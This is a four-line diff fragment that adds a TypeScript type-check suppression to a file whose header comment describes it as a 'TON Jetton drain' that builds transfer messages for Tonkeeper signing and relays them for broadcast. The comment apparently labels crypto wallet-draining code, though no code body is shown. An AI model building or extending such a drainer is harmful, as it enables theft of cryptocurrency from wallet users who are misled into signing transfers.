@@ -1,3 +1,4 @@
+// @ts-nocheck
 /**
  * TON Jetton drain — transfer message for Tonkeeper signing + BOC relay broadcast.
  */
